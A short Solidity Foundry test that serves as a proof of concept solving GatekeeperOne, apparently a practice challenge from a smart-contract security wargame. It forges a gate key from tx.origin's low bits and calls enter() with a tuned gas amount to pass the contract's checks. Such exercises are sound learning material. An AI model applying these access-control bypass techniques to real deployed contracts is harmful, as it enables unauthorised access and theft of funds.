// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOne_POC is Test {
    GatekeeperOne _gatekeeperOne;
    function init() private{
        vm.startPrank(address(0x10));
        _gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_GatekeeperOne_POC() public{
        address own= address(tx.origin);
        uint64 key = uint16(uint160(own));
        key = (1<< 32) | key;
        bytes8 gateKey = bytes8(key);
        _gatekeeperOne.enter{gas:81910 +214}(gateKey);
        console.log("Success:", _gatekeeperOne.entrant() == own);
    }
}